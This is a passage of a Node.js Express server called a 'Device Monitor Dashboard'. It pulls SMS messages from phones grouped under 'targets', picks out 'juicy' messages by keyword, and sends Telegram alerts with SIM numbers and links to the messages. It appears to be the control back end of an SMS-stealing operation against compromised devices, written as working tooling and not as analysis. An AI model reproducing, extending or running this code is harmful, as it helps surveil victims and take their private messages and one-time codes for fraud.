    config.triggers.includes('new_sms') &&
    oldRecord !== null &&
    oldRecord.last_activity !== null &&
    newRecord.last_activity !== null &&
    newRecord.last_activity !== oldRecord.last_activity
  ) {
    const smsUrl = getSmsLink(target, deviceId, newRecord.obj_id).replace('?print=pretty', '?print=pretty');
    const text =
      `📩 [${bot.name}]\n` +
      `Device: ${deviceId}\n` +
      `URL Set: ${urlSet} (ID ${target.id})\n` +
      `Brand: ${newRecord.brand ?? 'Unknown'}\n` +
      `New SMS activity detected\n` +
      `Last Activity: ${newRecord.last_activity}\n` +
      `SIM1: ${newRecord.sim1_number ?? 'N/A'}\n` +
      `SMS: ${smsUrl}`;
    for (const chatId of subscribers) sendTelegramAlert(bot.token, chatId, text);
    appendAlertLog({ botName: bot.name, deviceId, urlSet, targetId: target.id, type: 'new_sms', text, chatCount: subscribers.length });
  }
}

// ── Telegram Bot Management API ───────────────────────────────────────────────

app.post('/api/telegram/bots', express.json(), (req, res) => {
  const { name, token } = req.body || {};
  if (!name || typeof name !== 'string' || !name.trim())
    return res.status(400).json({ error: 'name is required and must be non-empty' });
  if (name.trim().length > MAX_BOT_NAME)
    return res.status(400).json({ error: `name exceeds ${MAX_BOT_NAME} characters` });
  if (!token || typeof token !== 'string' || !token.trim())
    return res.status(400).json({ error: 'token is required and must be non-empty' });
  if (token.trim().length > MAX_BOT_TOKEN)
    return res.status(400).json({ error: `token exceeds ${MAX_BOT_TOKEN} characters` });
  const duplicate = Object.entries(alertStore.bots).find(([, b]) => b.token === token.trim());
  if (duplicate) return res.status(409).json({ error: 'A bot with this token already exists' });
  const id = crypto.randomUUID();
  alertStore.bots[id] = { name: name.trim(), token: token.trim(), subscribers: [] };
  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
  // Kick off subscriber sync in background
  syncBotSubscribers(id);
  res.status(201).json({ id, name: alertStore.bots[id].name });
});

app.get('/api/telegram/bots', (req, res) => {
  const list = Object.entries(alertStore.bots).map(([id, b]) => ({ id, name: b.name }));
  res.json(list);
});

app.patch('/api/telegram/bots/:id', express.json(), (req, res) => {
  const bot = alertStore.bots[req.params.id];
  if (!bot) return res.status(404).json({ error: 'Bot not found' });
  const { name } = req.body || {};
  if (!name || typeof name !== 'string' || !name.trim())
    return res.status(400).json({ error: 'name is required and must be non-empty' });
  if (name.trim().length > MAX_BOT_NAME)
    return res.status(400).json({ error: `name exceeds ${MAX_BOT_NAME} characters` });
  bot.name = name.trim();
  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
  res.json({ id: req.params.id, name: bot.name });
});

app.delete('/api/telegram/bots/:id', (req, res) => {
  if (!alertStore.bots[req.params.id]) return res.status(404).json({ error: 'Bot not found' });
  delete alertStore.bots[req.params.id];
  for (const urlSet of VALID_URL_SETS) {
    for (const [devId, cfg] of Object.entries(alertStore.alerts[urlSet] || {})) {
      if (cfg.bot_id === req.params.id) delete alertStore.alerts[urlSet][devId];
    }
  }
  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
  res.status(204).end();
});

// ── Telegram Alert Configuration API ─────────────────────────────────────────

function validateUrlSet(req, res, next) {
  if (!VALID_URL_SETS.has(req.params.urlSet)) {
    return res.status(400).json({ error: `Invalid urlSet "${req.params.urlSet}". Must be one of: new, old, pp, srk` });
  }
  next();
}

app.put('/api/telegram/alerts/:urlSet/:deviceId', express.json(), validateUrlSet, (req, res) => {
  const { bot_id, triggers } = req.body || {};
  if (!bot_id || !triggers)
    return res.status(400).json({ error: 'bot_id and triggers are required' });
  if (!alertStore.bots[bot_id])
    return res.status(400).json({ error: `bot_id "${bot_id}" does not exist` });
  if (!Array.isArray(triggers) || triggers.length === 0)
    return res.status(400).json({ error: 'triggers must be a non-empty array' });
  const invalid = triggers.filter(t => !VALID_TRIGGERS.has(t));
  if (invalid.length)
    return res.status(400).json({ error: `Invalid trigger values: ${invalid.join(', ')}` });
  const cfg = { bot_id, triggers };
  alertStore.alerts[req.params.urlSet][req.params.deviceId] = cfg;
  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
  res.json(cfg);
});

app.get('/api/telegram/alerts/:urlSet/:deviceId', validateUrlSet, (req, res) => {
  const cfg = alertStore.alerts[req.params.urlSet]?.[req.params.deviceId];
  if (!cfg) return res.status(404).json({ error: 'Alert config not found' });
  res.json(cfg);
});

app.delete('/api/telegram/alerts/:urlSet/:deviceId', validateUrlSet, (req, res) => {
  const section = alertStore.alerts[req.params.urlSet];
  if (!section?.[req.params.deviceId]) return res.status(404).json({ error: 'Alert config not found' });
  delete section[req.params.deviceId];
  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
  res.status(204).end();
});

app.get('/api/telegram/alerts/:urlSet', validateUrlSet, (req, res) => {
  res.json(alertStore.alerts[req.params.urlSet] || {});
});

// ── Juicy SMS: return only SMS messages that match active juicy keywords ───────
app.get('/api/url/:id/device/:deviceId/juicy-sms', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const mode = req.query.mode || 'new';
  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });
  const db = getTargetDb(target);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const activeKws = JUICY_KEYWORDS; // current editable list
  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
  try {
    const smsData = await fbFetch(fetchUrl);
    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body) continue;
      const lower = body.toLowerCase();
      const matched = activeKws.filter(kw => lower.includes(kw));
      if (matched.length) {
        hits.push({ body, matchedKeywords: matched });
        if (hits.length >= 200) break;
      }
    }
    res.json({ hits, total: hits.length, keywords: activeKws });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── Notifications: get recent alert log ──────────────────────────────────────
app.get('/api/notifications', (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const since = req.query.since; // ISO timestamp — only return entries newer than this
  let entries = alertLog.slice(0, limit);
  if (since) entries = entries.filter(e => e.ts > since);
  res.json({ entries, total: alertLog.length });
});

app.delete('/api/notifications', (req, res) => {
  alertLog = [];
  saveAlertLog();
  res.json({ ok: true });
});

// ── Telegram: get all chat IDs that have ever messaged this bot (getUpdates) ──
app.get('/api/telegram/bots/:id/subscribers', async (req, res) => {
  const bot = alertStore.bots[req.params.id];
  if (!bot) return res.status(404).json({ error: 'Bot not found' });
  // Sync first, then return stored list
  await syncBotSubscribers(req.params.id);
  const subscribers = alertStore.bots[req.params.id]?.subscribers || [];
  res.json({ chatIds: subscribers, total: subscribers.length });
});

// ── Telegram: manually trigger subscriber sync for a bot ─────────────────────
app.post('/api/telegram/bots/:id/sync', async (req, res) => {
  const bot = alertStore.bots[req.params.id];
  if (!bot) return res.status(404).json({ error: 'Bot not found' });
  await syncBotSubscribers(req.params.id);
  const subs = alertStore.bots[req.params.id]?.subscribers || [];
  res.json({ ok: true, subscribers: subs.length, chatIds: subs });
});

// ── Telegram: broadcast a message to given chat IDs via a bot ─────────────────
app.post('/api/telegram/bots/:id/broadcast', express.json(), async (req, res) => {
  const bot = alertStore.bots[req.params.id];
  if (!bot) return res.status(404).json({ error: 'Bot not found' });
  const { chatIds, message } = req.body || {};
  if (!Array.isArray(chatIds) || !chatIds.length)
    return res.status(400).json({ error: 'chatIds must be a non-empty array' });
  if (!message || typeof message !== 'string' || !message.trim())
    return res.status(400).json({ error: 'message is required' });

  const results = { sent: 0, failed: 0, errors: [] };
  for (const chatId of chatIds) {
    try {
      await sendTelegramAlert(bot.token, chatId, message.trim());
      results.sent++;
    } catch (e) {
      results.failed++;
      results.errors.push(`${chatId}: ${e.message}`);
    }
  }
  res.json(results);
});

// ── Serve frontend ────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ── Boot ──────────────────────────────────────────────────────────────────────
loadDashboardDb();
loadAlertStore();
// Sync subscribers for all bots at startup
syncAllBotSubscribers();
// Load custom keywords if saved, otherwise use built-in defaults
const savedKws = (() => {
  try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); } catch {}
  return null;
})();
if (savedKws && Array.isArray(savedKws)) {
  JUICY_KEYWORDS.length = 0;
  for (const k of savedKws) JUICY_KEYWORDS.push(k);
}
app.listen(PORT, () => {
  console.log(`Device Monitor Dashboard running at http://localhost:${PORT}`);
  console.log(`Dashboard DB: ${DB_FILE}`);
  runPoller(); // start background polling
});

